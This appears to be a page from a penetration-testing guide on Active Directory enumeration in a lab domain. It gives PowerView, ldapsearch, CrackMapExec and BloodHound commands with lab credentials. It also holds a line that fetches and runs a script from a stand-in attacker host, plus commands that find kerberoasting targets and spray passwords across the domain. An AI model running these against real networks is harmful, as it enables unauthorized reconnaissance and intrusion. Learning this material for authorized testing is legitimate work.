        <h2>Initial Enumeration — No Tools (Built-in Commands)</h2>
        <pre><code># From any domain-joined Windows machine (or after PsExec/WinRM):

# Domain info:
net user /domain                        # All domain users
net group /domain                       # All domain groups
net group "Domain Admins" /domain       # Members of Domain Admins
net group "Enterprise Admins" /domain
net accounts /domain                    # Password policy

# Current user context:
whoami /all                             # User, groups, privileges
whoami /priv                            # Just privileges

# Domain controller info:
nltest /dclist:SEVENKINGDOMS            # List DCs for domain
nslookup -type=SRV _ldap._tcp.dc._msdcs.sevenkingdoms.local

# Trust relationships:
nltest /domain_trusts /all_trusts</code></pre>

        <h2>PowerView Enumeration</h2>
        <p>PowerView is the gold standard for AD enumeration from PowerShell. Part of PowerSploit/PowerTools — load it reflectively from memory to avoid disk writes.</p>
        <pre><code># Load PowerView (reflective — no disk write):
IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/PowerView.ps1')
# Or from local path:
Import-Module .\PowerView.ps1

# Domain information:
Get-Domain                              # Current domain info
Get-DomainController                    # List domain controllers
Get-DomainController -Domain sevenkingdoms.local

# User enumeration:
Get-DomainUser                          # All domain users
Get-DomainUser -Properties name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogon
Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE   # Enabled users only

# Find interesting user attributes:
Get-DomainUser -SPN                     # Users with SPN set (kerberoasting targets)
Get-DomainUser -PreauthNotRequired      # AS-REP roasting targets
Get-DomainUser -AdminCount             # Users with AdminCount=1 (was privileged)

# Find users with password in description:
Get-DomainUser | Where-Object &#123;$_.description -ne $null&#125; | Select name,description

# Group enumeration:
Get-DomainGroup                         # All groups
Get-DomainGroup -AdminCount            # Privileged groups
Get-DomainGroupMember "Domain Admins"  # DA members
Get-DomainGroupMember "Enterprise Admins" -Recurse

# Computer enumeration:
Get-DomainComputer                      # All computers
Get-DomainComputer -Properties name,operatingsystem,dnshostname
Get-DomainComputer -Unconstrained       # Unconstrained delegation computers
Get-DomainComputer -TrustedToAuth       # Constrained delegation computers

# Trust enumeration:
Get-DomainTrust                         # Domain trusts
Get-ForestTrust                         # Forest trusts
Get-DomainTrust -Domain sevenkingdoms.local

# Find where DA users are logged in:
Find-DomainUserLocation -GroupName "Domain Admins"   # Finds active DA sessions

# Find local admin access:
Find-LocalAdminAccess                   # Where does current user have local admin?
# (noisy — generates many login attempts)</code></pre>

        <h2>LDAP Queries for AD Enumeration</h2>
        <pre><code>># From Linux with credentials (ldapsearch):

# Find all domain users with key attributes:
ldapsearch -x -H ldap://192.168.56.10 \
  -D 'NORTH\jon.snow' -w 'iknownothing' \
  -b 'DC=north,DC=sevenkingdoms,DC=local' \
  '(objectClass=user)' \
  cn sAMAccountName userAccountControl memberOf servicePrincipalName \
  pwdLastSet lastLogon description adminCount

# Find users with SPN (kerberoasting targets):
ldapsearch -x -H ldap://192.168.56.10 \
  -D 'NORTH\jon.snow' -w 'iknownothing' \
  -b 'DC=north,DC=sevenkingdoms,DC=local' \
  '(&(objectClass=user)(servicePrincipalName=*))' \
  cn sAMAccountName servicePrincipalName

# Find users with pre-auth disabled (AS-REP roasting):
ldapsearch -x -H ldap://192.168.56.10 \
  -D 'NORTH\jon.snow' -w 'iknownothing' \
  -b 'DC=north,DC=sevenkingdoms,DC=local' \
  '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  cn sAMAccountName

# userAccountControl flags (common):
# 512   = Normal account (NORMAL_ACCOUNT)
# 514   = Disabled account
# 66048 = Password never expires + normal account
# 4194304 = Don't require Kerberos pre-authentication (DONT_REQ_PREAUTH)</code></pre>

        <h2>CrackMapExec / NetExec AD Enumeration</h2>
        <pre><code># Enumerate domain users:
crackmapexec smb 192.168.56.11 -u 'jon.snow' -p 'iknownothing' \
  -d 'north.sevenkingdoms.local' --users

# Enumerate domain groups:
crackmapexec smb 192.168.56.11 -u 'jon.snow' -p 'iknownothing' \
  -d 'north.sevenkingdoms.local' --groups

# Enumerate shares across the domain:
crackmapexec smb 192.168.56.0/24 -u 'jon.snow' -p 'iknownothing' \
  -d 'north.sevenkingdoms.local' --shares

# Check for local admin access across subnet:
crackmapexec smb 192.168.56.0/24 -u 'jon.snow' -p 'iknownothing' \
  -d 'north.sevenkingdoms.local'
# Look for (Pwn3d!) in output — indicates local admin

# Password policy:
crackmapexec smb 192.168.56.11 -u 'jon.snow' -p 'iknownothing' \
  -d 'north.sevenkingdoms.local' --pass-pol

# Enumerate logged-in users (requires admin on target):
crackmapexec smb 192.168.56.22 -u 'administrator' -p 'password' \
  --loggedon-users</code></pre>

        <h2>Key AD Attributes to Target</h2>
        <pre><code># From PowerShell — check specific user attributes:
Get-ADUser -Filter * -Properties * | Select Name,SamAccountName,`
  ServicePrincipalName,DoesNotRequirePreAuth,AdminCount,`
  MemberOf,LastLogonDate,PasswordLastSet | Export-Csv users.csv

# From Windows — check password policy:
Get-ADDefaultDomainPasswordPolicy

# Find computers with unconstrained delegation:
Get-ADComputer -Filter &#123;TrustedForDelegation -eq $true&#125; -Properties TrustedForDelegation,Name,DnsHostName

# Find computers with constrained delegation:
Get-ADComputer -Filter &#123;TrustedToAuthForDelegation -eq $true&#125; -Properties *

# Find accounts where password = username (GOAD-style weak passwords):
# First enumerate users, then spray with username-as-password pattern
Get-DomainUser | Select samaccountname | % &#123;
  $u = $_.samaccountname
  # test $u with password $u
&#125;</code></pre>

        <h2>AD Enumeration with BloodHound CE</h2>
        <p>BloodHound Community Edition (CE) is the current version — a Docker-based rewrite replacing the old Electron app + Neo4j setup. Run BloodHound CE first, then collect and upload. See the <strong>BloodHound</strong> page for full workflow details.</p>
        <pre><code># BloodHound CE — Docker install (replaces old apt install bloodhound):
curl -L https://ghst.ly/getbhce | docker compose -f - up
# Access at http://localhost:8080 — first-run password shown in container stdout

# BloodHound collection from Linux using bloodhound-python:
pip3 install bloodhound
bloodhound-python -d sevenkingdoms.local \
  -u 'jon.snow@north.sevenkingdoms.local' \
  -p 'iknownothing' \
  -ns 192.168.56.10 \
  -c All \
  --zip
# --zip: creates a single zip file for easy upload to BloodHound CE

# SharpHound 2.x from Windows (released with BloodHound CE):
# Download: https://github.com/BloodHoundAD/SharpHound/releases
.\SharpHound.exe -c All --zipfilename collection.zip
# Upload the zip directly to BloodHound CE

# NOTE: The old SharpHound 1.x and JSON-file upload workflow is for legacy BloodHound only.
# BloodHound CE uses the --zip output directly.</code></pre>

